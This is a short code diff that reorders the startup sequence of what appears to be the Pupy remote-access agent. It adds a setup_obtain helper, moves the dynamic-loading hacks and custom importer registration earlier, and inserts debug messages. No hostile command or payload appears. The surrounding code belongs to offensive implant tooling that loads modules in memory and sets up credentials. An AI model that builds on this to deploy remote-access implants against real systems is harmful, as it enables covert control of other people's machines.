@@ -739,7 +739,6 @@ def init_pupy(argv, stdlib, debug=False):
     global logger
     global pupy
     global modules
-    global obtain
     global __dprint_method
     global __debug_file
 
@@ -777,10 +776,6 @@ def init_pupy(argv, stdlib, debug=False):
     __dprint_method = logger.debug
 
     import platform
-
-    from .utils import safe_obtain
-
-    obtain = safe_obtain
 
     platform._syscmd_uname = lambda *args, **kwargs: ''
 
@@ -834,6 +829,13 @@ def setup_network():
     load_modules()
 
 
+def setup_obtain():
+    global obtain
+
+    from .utils import safe_obtain
+    obtain = safe_obtain
+
+
 def prepare(argv=sys.argv, debug=False, config={}, stdlib=None):
     set_pupy_config(config)
 
@@ -842,21 +844,32 @@ def prepare(argv=sys.argv, debug=False, config={}, stdlib=None):
 
     init_pupy(argv, stdlib, debug)
 
-    from network.conf import load_network_modules
+    dprint("Apply dl_hacks..")
+
+    from .dl_hacks import apply_dl_hacks
+    apply_dl_hacks()
+    setup_obtain()
+
+    dprint("Register pupyimporter..")
+
     from .utils import register_pupyimporter
+    register_pupyimporter()
+
+    dprint("Prepare rest..")
+
     from .handlers import set_sighandlers
     from .ssl_hacks import apply_ssl_hacks
-    from .dl_hacks import apply_dl_hacks
 
-    register_pupyimporter()
+    from network.conf import load_network_modules
 
     set_sighandlers()
     apply_ssl_hacks()
-    apply_dl_hacks()
     load_memimporter_fallback()
     setup_credentials(config)
     setup_manager()
     load_network_modules()
+
+    dprint("Prepare complete")
 
 
 def main(argv=sys.argv, debug=False, config={}, stdlib=None):
